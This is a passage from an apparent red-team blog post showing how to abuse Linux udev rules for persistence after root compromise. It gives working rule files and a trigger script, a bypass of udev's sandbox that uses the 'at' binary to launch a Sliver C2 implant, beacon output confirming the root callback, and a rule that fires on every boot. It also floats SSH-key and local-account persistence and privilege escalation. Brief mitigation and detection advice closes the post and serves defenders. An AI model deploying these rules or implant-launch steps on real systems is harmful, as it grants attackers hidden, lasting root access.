</span></span></code></pre></div><p>To match the previous USB, we could point to its serial identifier. In this case, we&rsquo;ll create a symlink on connection:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:~$ cat /etc/udev/rules.d/test.rules
</span></span><span class=line><span class=cl><span class=nv>KERNEL</span><span class=o>==</span><span class=s2>&#34;sdb[0-9]&#34;</span>, <span class=nv>SUBSYSTEMS</span><span class=o>==</span><span class=s2>&#34;usb&#34;</span>, ENV<span class=o>{</span>ID_SERIAL_SHORT<span class=o>}==</span><span class=s2>&#34;E0D55EA57414F5B1289F03D5&#34;</span>, <span class=nv>SYMLINK</span><span class=o>+=</span><span class=s2>&#34;super_usb&#34;</span>
</span></span></code></pre></div><p>We unplug and plug in the USB, and confirm the execution of the rule by checking that the symbolic link has been generated:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:~$ ls -la /dev/super_usb 
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> root root <span class=m>4</span> Feb  <span class=m>5</span> 19:56 /dev/super_usb -&gt; sdb1
</span></span></code></pre></div><hr><p>On the other hand, instead of pointing to a specific device, it is possible to point to a father device. In other words, it is possible to point to <code>usb</code> subsystems or to the <code>PCI</code> subsystem. This is very interesting to us as attackers because this way the rule will be triggered even at system startup. It will not only help us to establish persistence upon the detection of a specific device but also ensure it at system startup.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:~$ cat /etc/udev/rules.d/test.rules
</span></span><span class=line><span class=cl><span class=nv>SUBSYSTEMS</span><span class=o>==</span><span class=s2>&#34;usb&#34;</span>, <span class=nv>RUN</span><span class=o>+=</span><span class=s2>&#34;/bin/sh -c &#39;touch /home/test/hi.txt&#39;&#34;</span>
</span></span></code></pre></div><h2 id=abusing-udev-rules-to-establish-persistence>Abusing <code>udev</code> rules to establish persistence<a hidden class=anchor aria-hidden=true href=#abusing-udev-rules-to-establish-persistence>#</a></h2><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Assumptions<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>As it is a persistence method, we start from a scenario where we have compromised the machine and have <code>root</code> privileges. In this case, the persistence method we will employ involves executing an implant that call home to our <code>Sliver</code> <code>C2</code> server. We could use a <code>dropper</code> to prevent the implant from touching the disk, but for the purposes of the PoC, we will directly download the implant to disk.</div></div></div><h3 id=it-seemed-too-easy>It seemed too easy<a hidden class=anchor aria-hidden=true href=#it-seemed-too-easy>#</a></h3><p>Having understood the theory, it seems easy:</p><ul><li>As a match key, we set the detection of any <code>usb</code> subsystem. Besides triggering when it detects a device of this type, this will ensure execution (i.e., persistence) on every system startup.</li><li>As a assignment key, we set the <code>RUN</code> key pointing to our implant.</li></ul><p>But before tackling with complexities, it&rsquo;s preferable to simplify in order to debug and check that all is working as expected. We&rsquo;ll create a rule that, instead of executing the implant, will run a script <code>.sh</code> which will write a file to disk.</p><p>The rule located at <code>/etc/udev/rules.d/ttp.rules</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:~$ cat /etc/udev/rules.d/ttp.rules
</span></span><span class=line><span class=cl><span class=nv>SUBSYSTEMS</span><span class=o>==</span><span class=s2>&#34;usb&#34;</span>, <span class=nv>RUN</span><span class=o>+=</span><span class=s2>&#34;/bin/sh -c &#39;/opt/scripts/trigger.sh&#39;&#34;</span>
</span></span></code></pre></div><p>The referenced script <code>/opt/scripts/trigger.sh</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># This workaround ensures that the execution is done only once.</span>
</span></span><span class=line><span class=cl><span class=c1># Not very fancy, but quick.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>FILE</span><span class=o>=</span>/home/test/file_udev<span class=k>$(($(</span>date <span class=s2>&#34;+%Y%m%d%H&#34;</span><span class=k>)))</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> ! -f <span class=nv>$FILE</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>	touch <span class=nv>$FILE</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>We give execution rights to the scripts and plug in the USB:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>test@test:/etc/udev/rules.d$ chmod +x /opt/scripts/trigger.sh
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ <span class=c1># check that the file doesn&#39;t exist</span>
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ ls -la /home/test/file_*
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ ls: cannot access <span class=s1>&#39;file_*&#39;</span>: No such file or directory
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ <span class=c1># plug in the USB</span>
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ <span class=c1># check that the rule has created the file</span>
</span></span><span class=line><span class=cl>test@test:/etc/udev/rules.d$ ls -la /home/test/file_*
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> root root <span class=m>0</span> ene <span class=m>11</span> 20:56 /home/test/file_1705002989316
</span></span></code></pre></div><p>The file is created, confirming the script execution through the <code>udev</code> rule after the event. The only thing left is to replace in the rule, on the <code>RUN</code> assignment key, the call to the script with the call to our implant:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>SUBSYSTEMS</span><span class=o>==</span><span class=s2>&#34;usb&#34;</span>, <span class=nv>RUN</span><span class=o>+=</span><span class=s2>&#34;/bin/sh -c &#39;/home/test/implant&#39;&#34;</span>
</span></span></code></pre></div><p>We set the listener in the <code>C2</code> server and plug in the USB as in the previous case. But nothing&mldr; complete silence on our <code>C2</code> console. Neither calling the implant directly in the rule or through a <code>.sh</code> script&mldr; nothing.</p><figure class=align-center><img loading=lazy src=/posts/leveraging-Linux-udev-for-persistence/desertball.gif#center><figcaption><p>My C2 console at that moment</p></figcaption></figure><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>The references mentioned in the introduction (<a href=https://codexlynx.github.io/posts/2021/04/gaining-persistence-linux-udev.html>[4]</a> and <a href=https://hadess.io/the-art-of-linux-persistence/>[5]</a>) regarding <code>udev</code> as a persistence method end here: they directly call the payload from the rule, without considering the constraints presented by <code>udev</code>. Therefore, they are not functional, at least currently, for using a payload that requires a network-connected and long-running process, essential requirements for establishing network-level persistence.</div></div></div><h3 id=rtfm-udev-restrictions>RTFM: <code>udev</code> restrictions<a hidden class=anchor aria-hidden=true href=#rtfm-udev-restrictions>#</a></h3><p>According to <code>udev</code> man page:</p><blockquote><p><strong>This can only be used for very short-running foreground tasks</strong>. Running an event process for a long period of time may block all further events for this or a dependent device.</p><p>Note that <strong>running programs that access the network or mount/unmount filesystems is not allowed</strong> inside of udev rules, due to the <strong>default sandbox that is enforced on systemd-udevd.service</strong>.</p><p><strong>Starting daemons or other long-running processes is not allowed; the forked processes, detached or not, will be unconditionally killed after the event handling has finished</strong>. In order to activate long-running processes from udev rules, provide a service unit and pull it in from a udev device using the <em>SYSTEMD_WANTS</em> device property. See <a href=https://man.archlinux.org/man/systemd.device.5.en>systemd.device(5)</a> for details.</p></blockquote><p>It seems that we have ran into a dead end here. <code>udev</code> is executed in a sandbox with some restrictions that are vital to our persistence through the execution of the implant:</p><ul><li>it doesn&rsquo;t allow network access for the executed processes</li><li>it doesn&rsquo;t allow running processes in background or long running processes</li></ul><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>Reading the last sentence of the previous <code>man</code>, there is an option through calling a service. This option doesn&rsquo;t make much sense for us since persistence would take place through <code>T1543.002 Create or Modify System Process: Systemd Service</code>. It would be more logical to create the malicious service directly rather than calling it through <code>udev</code>.</div></div></div><p>But now that we&rsquo;ve made it this far, we won&rsquo;t give up.</p><h3 id=bypassing-udev-restrictions>Bypassing <code>udev</code> restrictions<a hidden class=anchor aria-hidden=true href=#bypassing-udev-restrictions>#</a></h3><p>If <code>udev</code> presents these constraints, why not, through the rule, create a new independent and detached process that won&rsquo;t have the restrictions and use it to execute the implant? Two options come to my mind:</p><ul><li>The quickest: use a <code>GTFOBin</code> such as <a href=https://gtfobins.github.io/gtfobins/at/><code>at</code></a> that will execute the implant. <code>at</code> allows scheduling the execution of commands in the future. Thus, taking a look at the process tree it won&rsquo;t be attached to <code>udev</code> and therefore won&rsquo;t have the restrictions. There are <a href=https://askubuntu.com/questions/1166849/18-04-how-can-udev-rule-run-script-access-network>references [3]</a> regarding to this to execute scripts with network access. Additionally, regarding long-runnning process, one of the <a href=https://www.reactivated.net/writing_udev_rules.html>previous references [1]</a> glimpses this possibility:</li></ul><blockquote><p>One workaround for this limitation is to make sure your program immediately detaches itself.</p></blockquote><ul><li>Process injection. To inject the implant shellcode in another process could be a more than a feasible option to bypass<code>udev</code> restrictions. This option is out of the scope of this article and is left as an exercise for the reader.</li></ul><h4 id=using-at-to-bypass-restrictions>Using <code>at</code> to bypass restrictions<a hidden class=anchor aria-hidden=true href=#using-at-to-bypass-restrictions>#</a></h4><p>The good thing about <code>at</code> is that is a binary from the official repositories, and it&rsquo;s installed by default in some distributions . This turns it into a <code>Living Of The Land Binary</code> (called specifically <code>GTFOBin</code> for <code>Unix</code> binaries), which will help us going under the radar in some cases.</p><p>So let&rsquo;s generate the rule (<code>/etc/udev/rules.d/ttp.rules</code>) calling <code>at</code>, that will schedule the implant to execute at the same time:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>SUBSYSTEMS</span><span class=o>==</span><span class=s2>&#34;usb&#34;</span>, <span class=nv>RUN</span><span class=o>+=</span><span class=s2>&#34;/usr/bin/at -M -f /opt/scripts/trigger.sh now&#34;</span>
</span></span></code></pre></div><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>In the case of Ubuntu Server 22.04 LTS, it is necessary to install <code>at</code> from the official repositories if it has not been installed previously.</div></div></div><p>The script pointed by <code>at</code> located at <code>/opt/scripts/trigger.sh</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># This workaround ensures that the execution is done only once.</span>
</span></span><span class=line><span class=cl><span class=c1># Not very fancy, but quick.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>FILE</span><span class=o>=</span>/home/test/file_udev<span class=k>$(($(</span>date <span class=s2>&#34;+%Y%m%d%H&#34;</span><span class=k>)))</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> ! -f <span class=nv>$FILE</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>	touch <span class=nv>$FILE</span>
</span></span><span class=line><span class=cl>	/home/test/implant
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></div><p>Let&rsquo;s plug in a USB and&mldr; we receive the connection on our <code>C2</code>! (if we boot the machine, we get the same result without the need of plugging in a USB):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Beacon 52e736e5 BROKEN_THERAPIST - 10.0.2.6:34500 <span class=o>(</span><span class=nb>test</span><span class=o>)</span> - linux/amd64 - Mon, <span class=m>22</span> Jan <span class=m>2024</span> 21:03:08 CET
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sliver &gt; use 52e736e5-0027-4a8c-8d40-b151759c163d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Active beacon BROKEN_THERAPIST <span class=o>(</span>52e736e5-0027-4a8c-8d40-b151759c163d<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sliver <span class=o>(</span>BROKEN_THERAPIST<span class=o>)</span> &gt; info
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         Beacon ID: 52e736e5-0027-4a8c-8d40-b151759c163d
</span></span><span class=line><span class=cl>              Name: BROKEN_THERAPIST
</span></span><span class=line><span class=cl>          Hostname: <span class=nb>test</span>
</span></span><span class=line><span class=cl>              UUID: 6ca0c150-15de-41a7-b798-7640129e1b93
</span></span><span class=line><span class=cl>          Username: root
</span></span><span class=line><span class=cl>               UID: <span class=m>0</span>
</span></span><span class=line><span class=cl>               GID: <span class=m>0</span>
</span></span><span class=line><span class=cl>               PID: <span class=m>1697</span>
</span></span><span class=line><span class=cl>                OS: linux
</span></span><span class=line><span class=cl>           Version: Linux <span class=nb>test</span> 5.15.0-91-generic
</span></span><span class=line><span class=cl>            Locale: 
</span></span><span class=line><span class=cl>              Arch: amd64
</span></span><span class=line><span class=cl>         Active C2: mtls://10.0.2.15:8888
</span></span><span class=line><span class=cl>    Remote Address: 10.0.2.6:34500
</span></span><span class=line><span class=cl>         Proxy URL: 
</span></span><span class=line><span class=cl>          Interval: 5s
</span></span><span class=line><span class=cl>            Jitter: 3s
</span></span><span class=line><span class=cl>     First Contact: Mon Jan <span class=m>22</span> 21:03:08 CET <span class=m>2024</span> <span class=o>(</span>8s ago<span class=o>)</span>
</span></span><span class=line><span class=cl>      Last Checkin: Mon Jan <span class=m>22</span> 21:03:09 CET <span class=m>2024</span> <span class=o>(</span>7s ago<span class=o>)</span>
</span></span><span class=line><span class=cl>      Next Checkin: Mon Jan <span class=m>22</span> 21:03:15 CET <span class=m>2024</span> <span class=o>(</span>1s ago<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sliver <span class=o>(</span>BROKEN_THERAPIST<span class=o>)</span> &gt;  
</span></span></code></pre></div><p>Let&rsquo;s see it in action:</p><video width=100% preload controls>
<source src=/posts/leveraging-Linux-udev-for-persistence/persistence_udev_usb.webm type=video/webm><source src=/posts/leveraging-Linux-udev-for-persistence/persistence_udev_usb.mp4 type=video/mp4>Your browser does not support the video tag.</video><p>We can also modify the match key of the rule to match the detection of any network interface different from <code>loopback</code>. This way, we ensure that each time the machine counts with a valid network interface, it&rsquo;ll try to establish the connection to the <code>C2</code>. This event is produced at system startup. The rule would be the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>SUBSYSTEM</span><span class=o>==</span><span class=s2>&#34;net&#34;</span>, KERNEL!<span class=o>=</span><span class=s2>&#34;lo&#34;</span>, <span class=nv>RUN</span><span class=o>+=</span><span class=s2>&#34;/usr/bin/at -M -f /opt/scripts/trigger.sh now&#34;</span>
</span></span></code></pre></div><p>So each time the system boots, the persistence will be triggered:</p><video width=100% preload controls>
<source src=/posts/leveraging-Linux-udev-for-persistence/persistence_udev_iface.webm type=video/webm><source src=/posts/leveraging-Linux-udev-for-persistence/persistence_udev_iface.mp4 type=video/mp4>Your browser does not support the video tag.</video><h2 id=mitigation-and-detection>Mitigation and detection<a hidden class=anchor aria-hidden=true href=#mitigation-and-detection>#</a></h2><h3 id=mitigation>Mitigation<a hidden class=anchor aria-hidden=true href=#mitigation>#</a></h3><p>Disabling the <code>udev</code> service (<code>systemd-udevd.service</code>) might seem like a good mitigation, but its capabilities would be lost. It could also present problems with the management and detection of devices. If this action is carried out, the consequences and caveats should be studied in depth before deploying in a production environment.</p><h3 id=detection>Detection<a hidden class=anchor aria-hidden=true href=#detection>#</a></h3><p>The detection mechanisms can be stablished at different levels:</p><ul><li>File system<ul><li>Monitor the creation and modification of files in the directories where <code>udev</code> rules are located: <code>/etc/udev/rules.d/</code>, <code>/usr/lib/udev/rules.d/</code> and <code>/run/udev/rules.d/</code>.</li><li>Analyze and monitor changes on the files referenced in the rules, specifically in the <code>RUN</code> assignment key.</li></ul></li><li>Process creation<ul><li>Monitor the creation of new processes that are children of <code>systemd-udevd.service</code> at the process tree level.<figure class=align-center><img loading=lazy src=/posts/leveraging-Linux-udev-for-persistence/udev_child_process.png#center></figure><figure class=align-center><img loading=lazy src=/posts/leveraging-Linux-udev-for-persistence/udev_child_proces_2.png#center><figcaption><p>Process tree after implant execution</p></figcaption></figure></li></ul></li></ul><h2 id=other-abuses>Other (ab)uses<a hidden class=anchor aria-hidden=true href=#other-abuses>#</a></h2><p>Other use cases come to my mind from an attacker perspective:</p><ol><li>Other persistence alternatives. We covered the execution of the implant, but there are another options that could be interesting to trigger from <code>udev</code>, such as: <code>T1136.001 Create Account: Local Account</code> or <code>T1098.004 Account Manipulation: SSH Authorized Keys</code>.</li><li>Privilege escalation: if we have compromised a user that has privileges to modify a <code>udev</code> rule file, or either the assignment key <code>RUN</code> points to the execution of a script or binary over which we have write privileges, this method could be used to escalate privileges on the system, as is being run as <code>root</code>.</li></ol><h2 id=final-words>Final words<a hidden class=anchor aria-hidden=true href=#final-words>#</a></h2><p>In this post we have seen how to leverage <code>udev</code> to use it as a feasible persistence mechanism with the execution of a network implant, bypassing the restrictions in place due to its sandbox capabilities. I hope you find it useful and incorporate it into your red team arsenal or enhance your detection mechanisms. If you find any errors, have relevant information, or come across references discussing <code>udev</code> that consider the restrictions, don&rsquo;t hesitate to contact me to include them.</p><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ul><li>[1] <a href=https://www.reactivated.net/writing_udev_rules.html>https://www.reactivated.net/writing_udev_rules.html</a></li><li>[2] <a href=https://wiki.archlinux.org/title/Udev>https://wiki.archlinux.org/title/Udev</a></li><li>[3] <a href=https://askubuntu.com/questions/1166849/18-04-how-can-udev-rule-run-script-access-network>https://askubuntu.com/questions/1166849/18-04-how-can-udev-rule-run-script-access-network</a></li><li>[4] <a href=https://codexlynx.github.io/posts/2021/04/gaining-persistence-linux-udev.html>https://codexlynx.github.io/posts/2021/04/gaining-persistence-linux-udev.html</a></li><li>[5] <a href=https://hadess.io/the-art-of-linux-persistence/>https://hadess.io/the-art-of-linux-persistence/</a></li><li>[6] <a href=https://attack.mitre.org/techniques/T1546/017/>https://attack.mitre.org/techniques/T1546/017/</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/persistence/>Persistence</a></li><li><a href=http://localhost:1313/tags/linux/>Linux</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on x" href="https://x.com/intent/tweet/?text=Leveraging%20Linux%20udev%20for%20persistence&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f&amp;hashtags=persistence%2clinux"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f&amp;title=Leveraging%20Linux%20udev%20for%20persistence&amp;summary=Leveraging%20Linux%20udev%20for%20persistence&amp;source=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f&title=Leveraging%20Linux%20udev%20for%20persistence"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on whatsapp" href="https://api.whatsapp.com/send?text=Leveraging%20Linux%20udev%20for%20persistence%20-%20http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on telegram" href="https://telegram.me/share/url?text=Leveraging%20Linux%20udev%20for%20persistence&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leveraging Linux udev for persistence on ycombinator" href="https://news.ycombinator.com/submitlink?t=Leveraging%20Linux%20udev%20for%20persistence&u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fleveraging-Linux-udev-for-persistence%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Eder's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
